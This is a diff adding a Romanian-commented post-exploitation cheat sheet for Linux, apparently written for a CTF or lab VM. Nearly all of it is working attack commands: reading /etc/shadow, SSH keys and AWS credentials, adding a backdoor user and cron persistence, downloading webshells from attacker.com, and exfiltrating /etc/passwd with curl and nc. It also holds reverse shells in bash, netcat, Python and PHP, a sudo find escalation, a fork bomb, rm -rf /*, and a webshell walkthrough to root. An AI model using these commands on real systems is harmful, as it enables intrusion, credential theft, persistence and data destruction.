@@ -1,0 +1,125 @@
+# Informații sistem
+uname -a                    # kernel version
+cat /etc/os-release         # distribuție Linux
+cat /etc/issue              # OS info
+hostname                    # numele serverului
+id                          # user curent + grupuri
+whoami                      # user curent
+who                         # cine e logat
+w                           # utilizatori activi
+last                        # ultimele login-uri
+env                         # variabile de mediu (chei API uneori)
+set                         # toate variabilele
+
+# Listare directoare
+ls -la /                    # toate directoarele root
+ls -la /home                # utilizatori
+ls -la /var/www             # fișiere website (posibil configuri)
+ls -la /backup              # backup-uri
+
+# Găsire fișiere interesante
+find / -name "*.conf" 2>/dev/null | head -20
+find / -name "config.php" 2>/dev/null
+find / -name ".env" 2>/dev/null
+find /home -name "*.ssh" 2>/dev/null
+find / -name "id_rsa" 2>/dev/null   # chei SSH private 
+
+# Configurări și parole
+cat /etc/passwd             # utilizatori sistem (hash-uri în /etc/shadow)
+cat /etc/shadow             # parole hash (necesită root)
+cat /etc/sudoers            # cine poate face sudo
+cat /var/www/html/config.php   # baze de date (MySQL)
+cat .env                    # chei API, token-uri
+cat ~/.bash_history         # istoric comenzi utilizator
+cat ~/.mysql_history        # comenzi MySQL
+cat /var/log/mysql/error.log
+
+# Chei și token-uri
+cat ~/.ssh/id_rsa           # cheie privată SSH
+cat ~/.aws/credentials      # chei AWS
+cat /root/.aws/credentials
+
+
+# Adăugare utilizator (dacă ai root)
+useradd -m -s /bin/bash hacker
+echo "hacker:parola123" | chpasswd
+
+# Adăugare cheie SSH publică
+echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
+
+# Creare cron job pentru persistare
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'" >> /etc/crontab
+
+# Download webshell suplimentar
+curl http://attacker.com/shell.php -o /var/www/html/backdoor.php
+wget http://attacker.com/shell.php -O /var/www/html/shell2.php
+
+# Conexiuni rețea
+netstat -tulpn              # porturi deschise
+ss -tulpn                   # (alternativ)
+ip a                        # interfețe rețea
+ifconfig
+route -n                    # tabel rutare
+arp -a                      # dispozitive rețea locală
+
+# Exfiltrare date
+cat /etc/passwd | curl -X POST -d @- http://attacker.com/steal
+curl -F "file=@/etc/passwd" http://attacker.com/upload
+nc attacker.com 4444 < /etc/passwd
+
+# Verificare sudo
+sudo -l                     # ce comenzi poți rula ca sudo
+
+# SUID binaries (programe care rulează ca root)
+find / -perm -4000 2>/dev/null
+
+# Exploatare sudo (exemplu)
+sudo find /etc -exec whoami \;   # dacă find rulează ca sudo
+sudo cat /root/flag.txt
+
+# Kernel exploits (PERICULOS)
+uname -a                    # vezi kernel version
+# apoi cauți exploit pe https://exploit-db.com
+
+# Consum resurse
+:(){ :|:& };:               # fork bomb (PRUDENȚĂ!)
+dd if=/dev/zero of=/dev/null &  # CPU 100%
+rm -rf /*                   # șterge TOT sistemul (PERICULOS!)
+
+# Reverse shell la attacker.com (PORT 4444)
+bash -i >& /dev/tcp/attacker.com/4444 0>&1
+
+# Cu netcat
+nc -e /bin/sh attacker.com 4444
+
+# Cu python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Cu PHP (din webshell)
+php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Testare flow complet (pe VM ta)
+
+# 1. Afli userul
+?cmd=whoami
+Output: www-data
+
+# 2. Vezi ce poți accesa
+?cmd=ls+-la+/var/www
+Output: [lista fișiere]
+
+# 3. Cauți config DB
+?cmd=cat+/var/www/html/config.php
+Output: DB_PASSWORD="secret123"
+
+# 4. Verifici sudo
+?cmd=sudo+-l
+Output: (user ALL) NOPASSWD: /usr/bin/find
+
+# 5. Escalare
+?cmd=sudo+find+/etc+-exec+whoami+\;
+Output: root
+
+# 6. Acum ai root - poți face orice
+?cmd=cat+/root/flag.txt
+Output: CTF{you_got_root}
